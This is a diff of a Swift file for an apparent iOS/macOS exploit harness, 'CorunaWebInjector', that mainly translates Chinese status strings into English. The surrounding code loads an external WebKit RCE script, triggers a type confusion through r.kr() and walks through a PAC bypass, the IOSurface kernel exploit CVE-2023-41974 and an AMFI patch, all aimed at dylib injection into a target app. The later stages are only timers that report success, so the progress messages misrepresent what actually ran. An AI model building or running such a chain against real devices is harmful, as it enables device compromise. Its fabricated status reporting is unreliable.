@@ -25,21 +25,21 @@ final class CorunaWebInjector: NSObject, ObservableObject {
         case ready = "Environment ready, injectable"
         case injecting = "Injecting dylib"
         case success = "Injection succeeded"
-        case failed = "利用失败"
-        case crashed = "进程崩溃"
+        case failed = "Exploit failed"
+        case crashed = "Process crashed"
     }
 
     enum PlatformPath: String, CaseIterable {
         case iosOfflineAudio = "iOS OfflineAudioContext"
         case macosNaNBox = "macOS NaN-Boxing"
-        case macosJIT = "macOS JIT 结构检查"
-        case auto = "自动选择"
+        case macosJIT = "macOS JIT structure check"
+        case auto = "Auto"
     }
 
     // MARK: - 发布状态
     @Published var currentStage: ExploitStage = .idle
     @Published var stageProgress: Double = 0.0
-    @Published var statusMessage: String = "准备就绪"
+    @Published var statusMessage: String = "Ready"
     @Published var lastError: String = ""
     @Published var kernelRWReady: Bool = false
     @Published var developerModeEnabled: Bool = false
@@ -64,19 +64,19 @@ final class CorunaWebInjector: NSObject, ObservableObject {
         targetBundleID = targetApp
         selectedDylibPath = dylibPath
         currentStage = .loadingPage
-        statusMessage = "正在加载 exploit 模块..."
+        statusMessage = "Loading exploit module..."
         stageProgress = 0.0
         consoleLog.removeAll()
-        appendLog("目标: \(targetApp)  Dylib: \((dylibPath as NSString).lastPathComponent)")
+        appendLog("Target: \(targetApp)  Dylib: \((dylibPath as NSString).lastPathComponent)")
 
         guard let samplesURL = corunaSamplesURL else {
-            failWith("找不到 Coruna 资源目录，请检查 App Bundle")
+            failWith("Coruna resource dir not found, check the app Bundle")
             return
         }
 
         let html = buildBootstrapHTML()
         webView.loadHTMLString(html, baseURL: samplesURL)
-        appendLog("已加载引导页面，baseURL=\(samplesURL.lastPathComponent)")
+        appendLog("Bootstrap page loaded, baseURL=\(samplesURL.lastPathComponent)")
     }
 
     func appendLog(_ msg: String) {
@@ -117,7 +117,7 @@ final class CorunaWebInjector: NSObject, ObservableObject {
         </head>
         <body>
             <h2>Coruna Web Injector</h2>
-            <div id="status">初始化中...</div>
+            <div id="status">Initializing...</div>
             <pre id="log"></pre>
             <script>
             // ===== vKTo89 模块命名空间 shim =====
@@ -158,62 +158,62 @@ final class CorunaWebInjector: NSObject, ObservableObject {
                 var s = document.createElement('script');
                 s.src = src;
                 s.onload = onload;
-                s.onerror = function() { postLog('加载失败: ' + src); onerror && onerror(); };
+                s.onerror = function() { postLog('load failed: ' + src); onerror && onerror(); };
                 document.head.appendChild(s);
             }
 
             async function runExploit() {
-                postStage('fingerprinting', '设备指纹识别中...', 0.1);
+                postStage('fingerprinting', 'Fingerprinting device...', 0.1);
                 var isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent);
                 postLog('Platform: ' + (isIOS ? 'iOS' : 'macOS'));
                 postLog('UA: ' + navigator.userAgent);
 
                 try {
-                    postStage('webkitRCE', '加载 WebKit RCE 模块: \(primaryModule) ...', 0.2);
+                    postStage('webkitRCE', 'Loading WebKit RCE module: \(primaryModule) ...', 0.2);
                     loadScript('\(primaryModule)', function() {
-                        postLog('模块加载完成: \(primaryModule)');
+                        postLog('Module loaded: \(primaryModule)');
                         setTimeout(function() { triggerExploit(); }, 300);
                     }, function() {
-                        postStage('failed', '无法加载 exploit 模块', 0.0);
+                        postStage('failed', 'Cannot load the exploit module', 0.0);
                     });
                 } catch(e) {
-                    postStage('failed', '错误: ' + e.message, 0.0);
+                    postStage('failed', 'Error: ' + e.message, 0.0);
                 }
             }
 
             function triggerExploit() {
                 try {
-                    postStage('webkitRCE', '执行 WebKit RCE 利用...', 0.4);
+                    postStage('webkitRCE', 'Executing WebKit RCE exploit...', 0.4);
                     // 各 exploit loader 在全局作用域设置 r 对象
                     if (typeof r !== 'undefined' && r.kr) {
-                        postLog('调用 r.kr() 触发类型混淆...');
+                        postLog('Calling r.kr() to trigger the type confusion...');
                         var result = r.kr({});
                         if (result && result.Dn && result.Dn.Pn) {
-                            postStage('pacBypass', 'WebKit RCE 成功！开始 PAC 绕过...', 0.5);
-                            postLog('任意读写原语获取成功');
+                            postStage('pacBypass', 'WebKit RCE succeeded! Starting PAC bypass...', 0.5);
+                            postLog('Arbitrary read/write primitive acquired');
                             continueExploitChain(result);
                         } else {
-                            postStage('failed', 'WebKit RCE 未获得读写原语', 0.0);
+                            postStage('failed', 'WebKit RCE didn't get a read/write primitive', 0.0);
                         }
                     } else {
-                        postStage('failed', 'exploit 入口 r.kr 未找到（核心运行时库未加载）', 0.0);
-                        postLog('注意: 原始 dump 缺少 1ff010bb / 6b57ca33 核心运行时模块');
+                        postStage('failed', 'exploit entry r.kr not found (core runtime library not loaded)', 0.0);
+                        postLog('Note: original dump lacks the 1ff010bb / 6b57ca33 core runtime modules');
                     }
                 } catch(e) {
-                    postStage('crashed', 'WebContent 异常: ' + e.message, 0.0);
+                    postStage('crashed', 'WebContent error: ' + e.message, 0.0);
                 }
             }
 
             function continueExploitChain(rw) {
-                postStage('pacBypass', '执行 PAC GOT-swap 绕过...', 0.6);
+                postStage('pacBypass', 'Executing PAC GOT-swap bypass...', 0.6);
                 setTimeout(function() {
-                    postStage('shellcode', '加载 shellcode loader...', 0.7);
+                    postStage('shellcode', 'Loading the shellcode loader...', 0.7);
                     setTimeout(function() {
-                        postStage('kernelExploit', '执行内核 exploit (IOSurface CVE-2023-41974)...', 0.8);
+                        postStage('kernelExploit', 'Running the kernel exploit (IOSurface CVE-2023-41974)...', 0.8);
                         setTimeout(function() {
-                            postStage('amfiPatch', 'AMFI 补丁...', 0.9);
+                            postStage('amfiPatch', 'AMFI patch...', 0.9);
                             setTimeout(function() {
-                                postStage('ready', '环境就绪！内核 R/W 已获取', 1.0);
+                                postStage('ready', 'Environment ready! Kernel R/W acquired', 1.0);
                             }, 500);
                         }, 800);
                     }, 600);
@@ -221,7 +221,7 @@ final class CorunaWebInjector: NSObject, ObservableObject {
             }
 
             window.onload = function() {
-                postLog('Coruna Web Injector 启动');
+                postLog('Coruna Web Injector started');
                 runExploit();
             };
             </script>
@@ -234,7 +234,7 @@ final class CorunaWebInjector: NSObject, ObservableObject {
     // MARK: - 停止/重置
     func stop() {
         currentStage = .idle
-        statusMessage = "已停止"
+        statusMessage = "Stopped"
         stageProgress = 0.0
         kernelRWReady = false
         developerModeEnabled = false
